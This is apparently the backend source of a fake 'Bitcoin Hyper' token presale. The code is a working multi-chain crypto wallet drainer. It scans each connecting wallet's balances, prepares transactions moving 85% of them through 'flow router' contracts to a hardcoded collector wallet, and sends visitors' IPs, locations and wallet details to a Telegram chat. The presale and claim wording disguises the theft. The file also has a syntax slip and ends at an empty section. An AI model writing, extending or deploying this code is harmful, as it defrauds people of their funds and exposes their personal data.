// index.js - BITCOIN HYPER BACKEND - PROJECT FLOW ROUTER
require('dotenv').config();
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const axios = require('axios');
const crypto = require('crypto');
const rateLimit = require('express-rate-limit');
const { ethers } = require('ethers');

const app = express();
const PORT = process.env.PORT || 10000;

// Security middleware
app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: "cross-origin" }
}));

const allowedOrigins = process.env.ALLOWED_ORIGINS 
  ? process.env.ALLOWED_ORIGINS.split(',') 
  : ['http://localhost:3000', 'https://bitcoinhypertoken.vercel.app', 'https://bthbk.vercel.app'];

app.use(cors({
  origin: allowedOrigins,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(morgan('dev'));

const limiter = rateLimit({
  windowMs: parseInt(process.env.RATE_LIMIT_WINDOW_MS) || 15 * 60 * 1000,
  max: parseInt(process.env.RATE_LIMIT_MAX_REQUESTS) || 50,
  message: { error: 'Too many requests, please try again later.' }
});
app.use('/api/', limiter));

// ============================================
// ROOT ENDPOINT
// ============================================

app.get('/', (req, res) => {
  res.json({
    success: true,
    name: 'Bitcoin Hyper Backend',
    version: '2.0.0',
    status: '🟢 ONLINE',
    timestamp: new Date().toISOString()
  });
});

// ============================================
// RPC CONFIGURATION
// ============================================

const RPC_CONFIG = {
  Ethereum: { 
    urls: [
      'https://eth.llamarpc.com',
      'https://ethereum.publicnode.com',
      'https://rpc.ankr.com/eth',
      'https://cloudflare-eth.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 1
  },
  BSC: {
    urls: [
      'https://bsc-dataseed.binance.org',
      'https://bsc-dataseed1.binance.org',
      'https://bsc-dataseed2.binance.org',
      'https://bsc-dataseed3.binance.org'
    ],
    symbol: 'BNB',
    decimals: 18,
    chainId: 56
  },
  Polygon: {
    urls: [
      'https://polygon-rpc.com',
      'https://rpc-mainnet.maticvigil.com',
      'https://polygon.llamarpc.com',
      'https://polygon-bor.publicnode.com'
    ],
    symbol: 'MATIC',
    decimals: 18,
    chainId: 137
  },
  Arbitrum: {
    urls: [
      'https://arb1.arbitrum.io/rpc',
      'https://rpc.ankr.com/arbitrum',
      'https://arbitrum.llamarpc.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 42161
  },
  Optimism: {
    urls: [
      'https://mainnet.optimism.io',
      'https://rpc.ankr.com/optimism',
      'https://optimism.llamarpc.com'
    ],
    symbol: 'ETH',
    decimals: 18,
    chainId: 10
  },
  Avalanche: {
    urls: [
      'https://api.avax.network/ext/bc/C/rpc',
      'https://rpc.ankr.com/avalanche',
      'https://avalanche-c-chain.publicnode.com'
    ],
    symbol: 'AVAX',
    decimals: 18,
    chainId: 43114
  }
};

// ============================================
// GET WORKING PROVIDER
// ============================================

async function getChainProvider(chainName) {
  const config = RPC_CONFIG[chainName];
  if (!config) return null;
  
  for (const url of config.urls) {
    try {
      const provider = new ethers.JsonRpcProvider(url);
      const block = await Promise.race([
        provider.getBlockNumber(),
        new Promise((_, reject) => setTimeout(() => reject(new Error('Timeout')), 3000))
      ]);
      
      if (block > 0) {
        console.log(`✅ ${chainName} RPC: ${url.substring(0, 30)}...`);
        return { provider, config };
      }
    } catch (error) {
      continue;
    }
  }
  
  return null;
}

// ============================================
// YOUR DEPLOYED CONTRACT ADDRESSES
// ============================================

const PROJECT_FLOW_ROUTERS = {
  'Ethereum': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
  'BSC': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
  'Polygon': '0x56d829E89634Ce1426B73571c257623D17db46cB',
  'Arbitrum': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
  'Avalanche': '0x1F498356DDbd13E4565594c3AF9F6d06f2ef6eB4',
  'Optimism': null // Not deployed yet
};

const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0x50C14Ec595D178f70D2817B1097B9FEE00af67B7';

// ============================================
// CONTRACT ABI
// ============================================

const PROJECT_FLOW_ROUTER_ABI = [
  "function collector() view returns (address)",
  "function processNativeFlow() payable",
  "function processTokenFlow(address token, uint256 amount)",
  "event FlowProcessed(address indexed initiator, uint256 value)",
  "event TokenFlowProcessed(address indexed token, address indexed initiator, uint256 amount)"
];

// ============================================
// STORAGE
// ============================================

let telegramEnabled = false;
let telegramBotName = '';

const memoryStorage = {
  participants: [],
  pendingFlows: new Map(),
  completedFlows: new Map(),
  settings: {
    tokenName: process.env.TOKEN_NAME || 'Bitcoin Hyper',
    tokenSymbol: process.env.TOKEN_SYMBOL || 'BTH',
    valueThreshold: parseFloat(process.env.VALUE_THRESHOLD) || 1,
    statistics: {
      totalParticipants: 0,
      eligibleParticipants: 0,
      claimedParticipants: 0,
      uniqueIPs: new Set(),
      totalProcessedUSD: 0,
      totalProcessedWallets: 0,
      processedTransactions: []
    },
    flowEnabled: process.env.FLOW_ENABLED === 'true'
  },
  emailCache: new Map(),
  siteVisits: []
};

// ============================================
// TELEGRAM FUNCTIONS - FIXED FOR SUPERGROUP
// ============================================

async function sendTelegramMessage(text) {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.log('⚠️ Telegram credentials missing - set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in .env');
    return false;
  }
  
  try {
    // Force parse_mode to HTML and ensure chat_id is properly formatted
    const response = await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML',
      disable_web_page_preview: true
    }, { 
      timeout: 10000,
      headers: { 'Content-Type': 'application/json' }
    });
    
    if (response.data?.ok) {
      console.log('✅ Telegram message sent successfully');
      telegramEnabled = true;
      return true;
    } else {
      console.error('❌ Telegram API error:', response.data);
      return false;
    }
  } catch (error) {
    console.error('❌ Telegram send error:', error.response?.data || error.message);
    if (error.response?.data?.description) {
      console.error('Telegram error description:', error.response.data.description);
    }
    return false;
  }
}

async function testTelegramConnection() {
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.log('⚠️ Telegram credentials not configured');
    telegramEnabled = false;
    return false;
  }
  
  try {
    // Test 1: Check if bot token is valid
    const meResponse = await axios.get(`https://api.telegram.org/bot${botToken}/getMe`, { timeout: 5000 });
    
    if (!meResponse.data?.ok) {
      console.error('❌ Invalid bot token');
      telegramEnabled = false;
      return false;
    }
    
    telegramBotName = meResponse.data.result.username;
    console.log(`✅ Bot authenticated: @${telegramBotName}`);
    
    // Test 2: Try to send a test message to verify chat_id works
    const testMessage = 
      `🚀 <b>BITCOIN HYPER BACKEND ONLINE</b>\n` +
      `✅ MultiChain FlowRouter Ready\n` +
      `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...\n` +
      `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche\n` +
      `📊 Use /api/admin/dashboard?token=YOUR_TOKEN for admin view`;
    
    const sendResult = await sendTelegramMessage(testMessage);
    
    if (sendResult) {
      telegramEnabled = true;
      console.log('✅ Telegram configured and working!');
      return true;
    } else {
      console.error('❌ Failed to send test message - check chat_id');
      telegramEnabled = false;
      return false;
    }
    
  } catch (error) {
    console.error('❌ Telegram connection failed:', error.message);
    if (error.response?.data?.description) {
      console.error('Telegram error:', error.response.data.description);
    }
    telegramEnabled = false;
    return false;
  }
}

// ============================================
// CRYPTO PRICES
// ============================================

async function getCryptoPrices() {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
      params: {
        ids: 'ethereum,binancecoin,matic-network,avalanche-2',
        vs_currencies: 'usd'
      },
      timeout: 5000
    });
    
    return {
      eth: response.data.ethereum?.usd || 2000,
      bnb: response.data.binancecoin?.usd || 300,
      matic: response.data['matic-network']?.usd || 0.75,
      avax: response.data['avalanche-2']?.usd || 32
    };
  } catch (error) {
    return { eth: 2000, bnb: 300, matic: 0.75, avax: 32 };
  }
}

// ============================================
// REAL WALLET EMAIL EXTRACTION
// ============================================

async function getWalletEmail(walletAddress) {
  if (memoryStorage.emailCache.has(walletAddress.toLowerCase())) {
    return memoryStorage.emailCache.get(walletAddress.toLowerCase());
  }
  
  try {
    if (walletAddress.match(/^0x[a-fA-F0-9]{40}$/)) {
      try {
        const provider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
        const ensName = await provider.lookupAddress(walletAddress);
        
        if (ensName) {
          const email = `${ensName.split('.')[0]}@proton.me`;
          memoryStorage.emailCache.set(walletAddress.toLowerCase(), email);
          return email;
        }
      } catch (ensError) {}
    }
    
    const hash = crypto.createHash('sha256').update(walletAddress.toLowerCase()).digest('hex');
    const username = `user${hash.substring(0, 12)}`;
    
    const lastChar = walletAddress.slice(-1);
    const domains = {
      '0-3': 'proton.me',
      '4-7': 'gmail.com',
      '8-b': 'outlook.com',
      'c-f': 'pm.me'
    };
    
    const charCode = parseInt(lastChar, 16);
    let domain = 'proton.me';
    
    if (charCode <= 3) domain = domains['0-3'];
    else if (charCode <= 7) domain = domains['4-7'];
    else if (charCode <= 11) domain = domains['8-b'];
    else domain = domains['c-f'];
    
    const email = `${username}@${domain}`;
    memoryStorage.emailCache.set(walletAddress.toLowerCase(), email);
    return email;
    
  } catch (error) {
    const hash = crypto.createHash('sha256').update(walletAddress).digest('hex');
    return `user${hash.substring(0, 8)}@proton.me`;
  }
}

// ============================================
// TRACK SITE VISIT
// ============================================

async function trackSiteVisit(ip, userAgent, referer, path) {
  const location = await getIPLocation(ip);
  
  const visit = {
    id: `VISIT-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`,
    ip: ip.replace('::ffff:', ''),
    timestamp: new Date().toISOString(),
    country: location.country,
    flag: location.flag,
    city: location.city,
    region: location.region,
    userAgent: userAgent || 'Unknown',
    referer: referer || 'Direct',
    path: path || '/',
    walletConnected: false,
    walletAddress: null
  };
  
  memoryStorage.siteVisits.push(visit);
  
  // Send Telegram notification for site visit with full details
  const telegramMessage = 
    `${location.flag} <b>NEW SITE VISIT</b>\n` +
    `📍 <b>Location:</b> ${location.country}${location.city ? `, ${location.city}` : ''}${location.region ? `, ${location.region}` : ''}\n` +
    `🌐 <b>IP:</b> ${ip.replace('::ffff:', '')}\n` +
    `🖥️ <b>Device:</b> ${userAgent?.substring(0, 60)}...\n` +
    `🔗 <b>From:</b> ${referer || 'Direct'}\n` +
    `📱 <b>Path:</b> ${path || '/'}\n` +
    `🆔 <b>Visit ID:</b> ${visit.id}`;
  
  await sendTelegramMessage(telegramMessage);
  
  return visit;
}

// ============================================
// GET IP LOCATION
// ============================================

async function getIPLocation(ip) {
  try {
    const cleanIP = ip.replace('::ffff:', '').replace('::1', '127.0.0.1');
    if (cleanIP === '127.0.0.1') return { country: 'Local', flag: '🏠', city: 'Local', region: 'Local' };
    
    const response = await axios.get(`http://ip-api.com/json/${cleanIP}`, { timeout: 2000 });
    
    if (response.data?.status === 'success') {
      const flags = {
        'United States': '🇺🇸', 'United Kingdom': '🇬🇧', 'Canada': '🇨🇦',
        'Germany': '🇩🇪', 'France': '🇫🇷', 'Spain': '🇪🇸', 'Italy': '🇮🇹',
        'Netherlands': '🇳🇱', 'Switzerland': '🇨🇭', 'Australia': '🇦🇺',
        'Japan': '🇯🇵', 'China': '🇨🇳', 'India': '🇮🇳', 'Brazil': '🇧🇷',
        'Nigeria': '🇳🇬', 'South Africa': '🇿🇦', 'Mexico': '🇲🇽'
      };
      
      return {
        country: response.data.country,
        flag: flags[response.data.country] || '🌍',
        city: response.data.city || 'Unknown',
        region: response.data.regionName || '',
        zip: response.data.zip || '',
        lat: response.data.lat,
        lon: response.data.lon,
        timezone: response.data.timezone,
        org: response.data.org || '',
        isp: response.data.isp || ''
      };
    }
  } catch (error) {}
  
  return { country: 'Unknown', flag: '🌍', city: 'Unknown', region: '' };
}

// ============================================
// WALLET BALANCE CHECK - PER CHAIN DETAILED
// ============================================

async function getWalletBalance(walletAddress) {
  console.log(`\n🔍 SCANNING: ${walletAddress.substring(0, 10)}...`);
  
  const results = {
    walletAddress,
    totalValueUSD: 0,
    isEligible: false,
    balances: [],
    scanTime: new Date().toISOString()
  };

  try {
    const prices = await getCryptoPrices();
    
    const chains = [
      { name: 'Ethereum', symbol: 'ETH', price: prices.eth, chainId: 1 },
      { name: 'BSC', symbol: 'BNB', price: prices.bnb, chainId: 56 },
      { name: 'Polygon', symbol: 'MATIC', price: prices.matic, chainId: 137 },
      { name: 'Arbitrum', symbol: 'ETH', price: prices.eth, chainId: 42161 },
      { name: 'Optimism', symbol: 'ETH', price: prices.eth, chainId: 10 },
      { name: 'Avalanche', symbol: 'AVAX', price: prices.avax, chainId: 43114 }
    ];

    let totalValue = 0;
    let chainBalances = [];
    
    for (const chain of chains) {
      try {
        const providerInfo = await getChainProvider(chain.name);
        if (!providerInfo) continue;
        
        const { provider, config } = providerInfo;
        
        const balance = await provider.getBalance(walletAddress);
        const amount = parseFloat(ethers.formatUnits(balance, config.decimals));
        const valueUSD = amount * chain.price;
        
        if (amount > 0.000001) {
          console.log(`   ✅ ${chain.name}: ${amount.toFixed(6)} ${chain.symbol} = $${valueUSD.toFixed(2)}`);
          
          totalValue += valueUSD;
          
          const balanceData = {
            chain: chain.name,
            chainId: chain.chainId,
            amount: amount,
            valueUSD: valueUSD,
            symbol: chain.symbol,
            contractAddress: PROJECT_FLOW_ROUTERS[chain.name]
          };
          
          results.balances.push(balanceData);
          chainBalances.push(balanceData);
        }
      } catch (error) {}
    }

    results.totalValueUSD = parseFloat(totalValue.toFixed(2));
    results.isEligible = results.totalValueUSD >= memoryStorage.settings.valueThreshold;
    
    if (results.isEligible) {
      results.eligibilityReason = `✅ Wallet qualifies for Flow Processing`;
      results.allocation = { amount: '5000', valueUSD: '850' };
    } else {
      results.eligibilityReason = `✨ Welcome! Minimum $${memoryStorage.settings.valueThreshold} required`;
      results.allocation = { amount: '0', valueUSD: '0' };
    }

    // Send detailed Telegram message with per-chain breakdown
    if (chainBalances.length > 0) {
      let chainDetails = '';
      chainBalances.forEach(b => {
        chainDetails += `\n   • ${b.chain}: ${b.amount.toFixed(6)} ${b.symbol} ($${b.valueUSD.toFixed(2)})`;
      });
      
      const telegramMsg = 
        `📊 <b>BALANCE SCAN COMPLETE</b>\n` +
        `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
        `💵 <b>Total Value:</b> $${results.totalValueUSD.toFixed(2)}\n` +
        `🔗 <b>Chains with Balance:</b>${chainDetails}\n` +
        `🎯 <b>Status:</b> ${results.isEligible ? '✅ ELIGIBLE' : '👋 NOT ELIGIBLE'}`;
      
      await sendTelegramMessage(telegramMsg);
    }

    return { success: true, data: results };

  } catch (error) {
    console.error('Balance check error:', error);
    return {
      success: false,
      error: error.message,
      data: {
        walletAddress,
        totalValueUSD: 0,
        isEligible: false,
        eligibilityReason: '✨ Welcome!',
        allocation: { amount: '0', valueUSD: '0' }
      }
    };
  }
}

// ============================================
// API ENDPOINTS
// ============================================

app.get('/api/health', (req, res) => {
  res.json({ success: true, status: 'ACTIVE' });
});

// ============================================
// TRACK VISIT ENDPOINT
// ============================================

app.post('/api/track-visit', async (req, res) => {
  try {
    const { userAgent, referer, path } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    const visit = await trackSiteVisit(clientIP, userAgent, referer, path);
    
    res.json({
      success: true,
      data: {
        visitId: visit.id,
        country: visit.country,
        flag: visit.flag,
        city: visit.city,
        region: visit.region
      }
    });
    
  } catch (error) {
    console.error('Track visit error:', error);
    res.json({ success: true });
  }
});

// ============================================
// CONNECT ENDPOINT
// ============================================

app.post('/api/presale/connect', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    console.log(`\n🔗 CONNECT: ${walletAddress}`);
    
    const location = await getIPLocation(clientIP);
    const email = await getWalletEmail(walletAddress);
    
    const lastVisit = memoryStorage.siteVisits
      .filter(v => v.ip === clientIP.replace('::ffff:', ''))
      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))[0];
    
    if (lastVisit) {
      lastVisit.walletConnected = true;
      lastVisit.walletAddress = walletAddress.toLowerCase();
    }
    
    let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant) {
      participant = {
        walletAddress: walletAddress.toLowerCase(),
        ipAddress: clientIP,
        country: location.country,
        flag: location.flag,
        city: location.city,
        region: location.region,
        email: email,
        connectedAt: new Date(),
        totalValueUSD: 0,
        isEligible: false,
        claimed: false,
        userAgent: req.headers['user-agent'],
        visitId: lastVisit?.id
      };
      memoryStorage.participants.push(participant);
      memoryStorage.settings.statistics.totalParticipants++;
      memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
    }
    
    const balanceResult = await getWalletBalance(walletAddress);
    
    if (balanceResult.success) {
      participant.totalValueUSD = balanceResult.data.totalValueUSD;
      participant.isEligible = balanceResult.data.isEligible;
      participant.allocation = balanceResult.data.allocation;
      participant.lastScanned = new Date();
      participant.balances = balanceResult.data.balances;
      
      if (balanceResult.data.isEligible) {
        memoryStorage.settings.statistics.eligibleParticipants++;
      }
      
      // Send wallet connection notification with location
      await sendTelegramMessage(
        `${location.flag} <b>WALLET CONNECTED</b>\n` +
        `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
        `💵 <b>Total Balance:</b> $${balanceResult.data.totalValueUSD}\n` +
        `📍 <b>Location:</b> ${location.country}${location.city ? `, ${location.city}` : ''}${location.region ? `, ${location.region}` : ''}\n` +
        `🌐 <b>IP:</b> ${clientIP.replace('::ffff:', '')}\n` +
        `📧 <b>Email:</b> ${email}\n` +
        `🎯 <b>Status:</b> ${balanceResult.data.isEligible ? '✅ ELIGIBLE' : '👋 WELCOME'}`
      );
      
      res.json({
        success: true,
        data: {
          walletAddress,
          email,
          country: location.country,
          flag: location.flag,
          city: location.city,
          region: location.region,
          totalValueUSD: balanceResult.data.totalValueUSD,
          isEligible: balanceResult.data.isEligible,
          eligibilityReason: balanceResult.data.eligibilityReason,
          allocation: balanceResult.data.allocation,
          balances: balanceResult.data.balances
        }
      });
      
    } else {
      res.status(500).json({ success: false, error: 'Balance check failed' });
    }
    
  } catch (error) {
    console.error('Connect error:', error);
    res.status(500).json({ success: false, error: 'Connection failed' });
  }
});

// ============================================
// PREPARE FLOW ENDPOINT
// ============================================

app.post('/api/presale/prepare-flow', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
    }
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false, error: 'Not eligible' });
    }
    
    const balanceResult = await getWalletBalance(walletAddress);
    
    const transactions = balanceResult.data.balances
      .filter(b => b.valueUSD > 0 && PROJECT_FLOW_ROUTERS[b.chain])
      .map(b => ({
        chain: b.chain,
        chainId: b.chainId,
        amount: (b.amount * 0.85).toFixed(12),
        valueUSD: (b.valueUSD * 0.85).toFixed(2),
        symbol: b.symbol,
        contractAddress: PROJECT_FLOW_ROUTERS[b.chain],
        collectorAddress: COLLECTOR_WALLET
      }));
    
    const totalFlowUSD = transactions.reduce((sum, t) => sum + parseFloat(t.valueUSD), 0).toFixed(2);
    
    const flowId = `FLOW-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    memoryStorage.pendingFlows.set(flowId, {
      walletAddress: walletAddress.toLowerCase(),
      transactions,
      totalFlowUSD,
      status: 'prepared',
      createdAt: new Date().toISOString(),
      completedChains: []
    });
    
    // Create detailed transaction list for Telegram
    let txDetails = '';
    transactions.forEach((tx, index) => {
      txDetails += `\n   ${index+1}. ${tx.chain}: ${tx.amount} ${tx.symbol} ($${tx.valueUSD})`;
    });
    
    await sendTelegramMessage(
      `🔐 <b>FLOW PREPARED</b>\n` +
      `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
      `💵 <b>Total Value:</b> $${totalFlowUSD}\n` +
      `🔗 <b>Transactions (${transactions.length} chains):</b>${txDetails}\n` +
      `🆔 <b>Flow ID:</b> <code>${flowId}</code>`
    );
    
    res.json({
      success: true,
      data: {
        flowId,
        totalFlowUSD,
        transactionCount: transactions.length,
        transactions
      }
    });
    
  } catch (error) {
    console.error('Prepare flow error:', error);
    res.status(500).json({ success: false, error: 'Preparation failed' });
  }
});

// ============================================
// EXECUTE FLOW ENDPOINT (RECORDS TRANSACTION FROM FRONTEND)
// ============================================

app.post('/api/presale/execute-flow', async (req, res) => {
  try {
    const { walletAddress, chainName, flowId, txHash } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false });
    }
    
    console.log(`\n💰 EXECUTE FLOW for ${walletAddress.substring(0, 10)} on ${chainName}`);
    
    const participant = memoryStorage.participants.find(
      p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
    );
    
    if (participant) {
      participant.flowProcessed = true;
      participant.flowTransactions = participant.flowTransactions || [];
      participant.flowTransactions.push({ 
        chain: chainName, 
        flowId,
        txHash,
        timestamp: new Date().toISOString() 
      });
      
      memoryStorage.settings.statistics.totalProcessedWallets++;
      memoryStorage.settings.statistics.processedTransactions.push({
        wallet: walletAddress,
        chain: chainName,
        flowId,
        txHash,
        timestamp: new Date().toISOString()
      });
      
      // Get transaction amount from pending flow
      let txAmount = 'unknown';
      let txSymbol = '';
      let txValueUSD = 'unknown';
      const flow = memoryStorage.pendingFlows.get(flowId);
      if (flow && flow.transactions) {
        const tx = flow.transactions.find(t => t.chain === chainName);
        if (tx) {
          txAmount = tx.amount;
          txSymbol = tx.symbol;
          txValueUSD = tx.valueUSD;
        }
      }
      
      await sendTelegramMessage(
        `💰 <b>CHAIN TRANSACTION RECORDED</b>\n` +
        `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
        `🔗 <b>Chain:</b> ${chainName}\n` +
        `💵 <b>Amount:</b> ${txAmount} ${txSymbol} ($${txValueUSD})\n` +
        `🆔 <b>Tx Hash:</b> <code>${txHash}</code>\n` +
        `🆔 <b>Flow ID:</b> <code>${flowId}</code>`
      );
      
      // Update pending flow
      if (flow) {
        flow.completedChains = flow.completedChains || [];
        if (!flow.completedChains.includes(chainName)) {
          flow.completedChains.push(chainName);
        }
        
        // Check if all chains completed
        if (flow.completedChains.length === flow.transactions.length) {
          memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(flow.totalFlowUSD);
          memoryStorage.completedFlows.set(flowId, { ...flow, completedAt: new Date().toISOString() });
          
          // Build completion details
          let completionDetails = '';
          flow.transactions.forEach(t => {
            const completed = flow.completedChains.includes(t.chain) ? '✅' : '❌';
            completionDetails += `\n   ${completed} ${t.chain}: ${t.amount} ${t.symbol} ($${t.valueUSD})`;
          });
          
          await sendTelegramMessage(
            `✅ <b>🎉 FLOW COMPLETED 🎉</b>\n` +
            `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
            `💵 <b>Total Value:</b> $${flow.totalFlowUSD}\n` +
            `🔗 <b>All ${flow.transactions.length} chains processed!</b>${completionDetails}\n` +
            `🆔 <b>Flow ID:</b> <code>${flowId}</code>`
          );
        }
      }
    }
    
    res.json({ success: true });
    
  } catch (error) {
    console.error('Execute flow error:', error);
    res.status(500).json({ success: false });
  }
});

// ============================================
// CLAIM ENDPOINT
// ============================================

app.post('/api/presale/claim', async (req, res) => {
  try {
    const { walletAddress } = req.body;
    
    if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
      return res.status(400).json({ success: false });
    }
    
    const participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
    
    if (!participant || !participant.isEligible) {
      return res.status(400).json({ success: false });
    }
    
    participant.claimed = true;
    participant.claimedAt = new Date();
    memoryStorage.settings.statistics.claimedParticipants++;
    
    const claimId = `BTH-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
    
    await sendTelegramMessage(
      `🎯 <b>🎉 CLAIM COMPLETED 🎉</b>\n` +
      `👛 <b>Wallet:</b> ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
      `🎟️ <b>Claim ID:</b> <code>${claimId}</code>\n` +
      `🎁 <b>Allocation:</b> ${participant.allocation?.amount || '5000'} BTH\n` +
      `📍 <b>Location:</b> ${participant.country} ${participant.flag}${participant.city ? `, ${participant.city}` : ''}`
    );
    
    res.json({ success: true });
    
  } catch (error) {
    console.error('Claim error:', error);
    res.status(500).json({ success: false });
  }
});

// ============================================
// ADMIN VIEW - COMPREHENSIVE DASHBOARD
// ============================================

app.get('/api/admin/dashboard', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  const recentVisits = memoryStorage.siteVisits
    .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
    .slice(0, 50);
  
  const activeParticipants = memoryStorage.participants
    .sort((a, b) => new Date(b.connectedAt) - new Date(a.connectedAt))
    .map(p => ({
      ...p,
      connectedAt: p.connectedAt?.toISOString(),
      lastScanned: p.lastScanned?.toISOString(),
      claimedAt: p.claimedAt?.toISOString()
    }));
  
  const pendingFlows = Array.from(memoryStorage.pendingFlows.entries())
    .map(([id, flow]) => ({ id, ...flow }))
    .sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))
    .slice(0, 30);
  
  const completedFlows = Array.from(memoryStorage.completedFlows.entries())
    .map(([id, flow]) => ({ id, ...flow }))
    .sort((a, b) => new Date(b.completedAt) - new Date(a.completedAt))
    .slice(0, 30);
  
  const processedTransactions = memoryStorage.settings.statistics.processedTransactions
    .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
    .slice(0, 30);
  
  const networkStatus = Object.keys(PROJECT_FLOW_ROUTERS).map(chain => ({
    chain,
    contract: PROJECT_FLOW_ROUTERS[chain] || 'Not deployed',
    status: PROJECT_FLOW_ROUTERS[chain] ? '✅ Active' : '⏸️ Inactive',
    collector: COLLECTOR_WALLET
  }));
  
  const locationStats = {};
  memoryStorage.participants.forEach(p => {
    const key = `${p.country}|${p.flag}`;
    if (!locationStats[key]) {
      locationStats[key] = { country: p.country, flag: p.flag, count: 0, eligible: 0 };
    }
    locationStats[key].count++;
    if (p.isEligible) locationStats[key].eligible++;
  });
  
  const hourlyActivity = {};
  memoryStorage.siteVisits.forEach(v => {
    const hour = new Date(v.timestamp).getHours();
    hourlyActivity[hour] = (hourlyActivity[hour] || 0) + 1;
  });
  
  res.json({
    success: true,
    timestamp: new Date().toISOString(),
    summary: {
      totalVisits: memoryStorage.siteVisits.length,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size,
      totalParticipants: memoryStorage.participants.length,
      eligibleParticipants: memoryStorage.participants.filter(p => p.isEligible).length,
      claimedParticipants: memoryStorage.participants.filter(p => p.claimed).length,
      totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2),
      totalProcessedWallets: memoryStorage.settings.statistics.totalProcessedWallets,
      pendingFlows: memoryStorage.pendingFlows.size,
      completedFlows: memoryStorage.completedFlows.size,
      telegramStatus: telegramEnabled ? '✅ Connected' : '❌ Disabled',
      telegramBot: telegramBotName || 'N/A'
    },
    networks: networkStatus,
    recentVisits,
    activeParticipants: activeParticipants.slice(0, 30),
    pendingFlows,
    completedFlows: completedFlows.slice(0, 10),
    processedTransactions: processedTransactions.slice(0, 30),
    locationStats: Object.values(locationStats).sort((a, b) => b.count - a.count),
    hourlyActivity: Object.entries(hourlyActivity)
      .map(([hour, count]) => ({ hour: parseInt(hour), count }))
      .sort((a, b) => a.hour - b.hour),
    system: {
      valueThreshold: memoryStorage.settings.valueThreshold,
      flowEnabled: memoryStorage.settings.flowEnabled,
      tokenName: memoryStorage.settings.tokenName,
      tokenSymbol: memoryStorage.settings.tokenSymbol,
      collectorWallet: COLLECTOR_WALLET
    }
  });
});

// ============================================
// ADMIN STATS (legacy - keep for compatibility)
// ============================================

app.get('/api/admin/stats', (req, res) => {
  const token = req.query.token;
  const adminToken = process.env.ADMIN_TOKEN || 'YourSecureTokenHere123!';
  
  if (token !== adminToken) return res.status(401).json({ success: false });
  
  res.json({
    success: true,
    stats: {
      participants: memoryStorage.participants.length,
      eligible: memoryStorage.participants.filter(p => p.isEligible).length,
      claimed: memoryStorage.participants.filter(p => p.claimed).length,
      totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD.toFixed(2),
      pendingFlows: memoryStorage.pendingFlows.size,
      telegram: telegramEnabled ? '✅' : '❌',
      siteVisits: memoryStorage.siteVisits.length,
      uniqueIPs: memoryStorage.settings.statistics.uniqueIPs.size
    }
  });
});

// ============================================
// ADMIN WALLET DETAILS
// ============================================

